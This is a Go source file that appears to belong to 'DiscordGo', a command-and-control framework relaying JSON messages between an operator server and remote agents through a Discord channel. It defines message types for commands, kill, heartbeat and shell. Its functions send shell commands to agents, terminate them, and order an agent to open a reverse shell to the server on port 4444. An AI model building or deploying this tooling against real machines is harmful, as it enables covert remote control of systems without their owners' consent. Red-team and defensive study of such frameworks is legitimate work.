package message

import (
	"encoding/json"
	"strings"

	"github.com/emmaunel/DiscordGo/pkg/util/constants"

	"github.com/bwmarrin/discordgo"
)

type Type int

const (
	MESSAGE_PING       Type = iota
	MESSAGE_PONG       Type = iota
	MESSAGE_OUTPUT     Type = iota
	MESSAGE_COMMAND    Type = iota
	MESSAGE_NEW        Type = iota
	MESSAGE_KILL       Type = iota
	MESSAGE_DISCONNECT Type = iota
	MESSAGE_RECONNECT  Type = iota
	MESSAGE_SHELL      Type = iota
	MESSAGE_HEARTBEAT       = iota
)

type Message struct {
	AgentID       string
	MessageType   Type
	Message       string
	Server        bool
	HasAttachment bool
}

// NewMessage wiill create a new Message struct and convert it json
func NewMessage(agentID string, message string, fromServer bool, hasAttachment bool, messageType Type) string {
	newMessage := &Message{}
	newMessage.AgentID = agentID
	newMessage.Message = message
	newMessage.MessageType = messageType
	newMessage.Server = fromServer
	newMessage.HasAttachment = hasAttachment

	// change to json
	messageJSON, _ := json.Marshal(newMessage)
	return string(messageJSON)
}

func CommandMessage(dg *discordgo.Session, agentID string, command string) {
	command = strings.TrimLeft(command, "cmd")
	command = strings.TrimSpace(command)
	message := NewMessage(agentID, command, true, false, MESSAGE_COMMAND)
	dg.ChannelMessageSend(constants.ChannelID, message)

}

// Ping is used by both the server and the agent
// When the server sends a ping,it's to make the agent is still alive
// When the agents send a ping, it's to make sure the server is up
func Ping(dg *discordgo.Session, agentID string, fromServer bool) {
	message := NewMessage(agentID, "", fromServer, false, MESSAGE_PING)
	dg.ChannelMessageSend(constants.ChannelID, message)
}

func Pong(dg *discordgo.Session, agentID string, fromServer bool) {
	message := NewMessage(agentID, "", fromServer, false, MESSAGE_PONG)
	dg.ChannelMessageSend(constants.ChannelID, message)
}

func KillAgent(dg *discordgo.Session, agentID string) {
	message := NewMessage(agentID, "", true, false, MESSAGE_KILL)
	dg.ChannelMessageSend(constants.ChannelID, message)
}

func SendShell(dg *discordgo.Session, agentID string, serverIP string) {
	message := NewMessage(agentID, serverIP+":4444", true, false, MESSAGE_SHELL)
	dg.ChannelMessageSend(constants.ChannelID, message)
}
